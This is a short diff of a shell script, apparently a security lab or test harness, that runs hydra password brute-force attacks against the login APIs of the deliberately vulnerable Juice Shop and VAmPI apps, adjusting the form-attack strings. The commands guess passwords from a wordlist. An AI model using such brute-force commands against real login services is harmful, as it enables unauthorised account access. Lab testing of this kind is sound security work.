@@ -79,7 +79,7 @@ hydra -l "admin@example.com" -P "${WORDLIST}" \
   -s 443 \
   "${TARGET}" \
   https-post-form \
-  '/juice-shop/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:F=Invalid' \
+  '/juice-shop/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:1=:F=Invalid' \
   -t 2 -w 5 -v ||
   echo "    WARN: hydra Juice Shop attack returned non-zero (may not have found valid creds)"
 
@@ -94,7 +94,7 @@ hydra -l admin -P "${WORDLIST}" \
   -s 443 \
   "${TARGET}" \
   https-post-form \
-  '/vampi/users/v1/login:{"username"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:F=error' \
+  '/vampi/users/v1/login:{"username"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:1=:F=error' \
   -t 2 -w 5 -v ||
   echo "    WARN: hydra VAmPI attack returned non-zero (may not have found valid creds)"
 
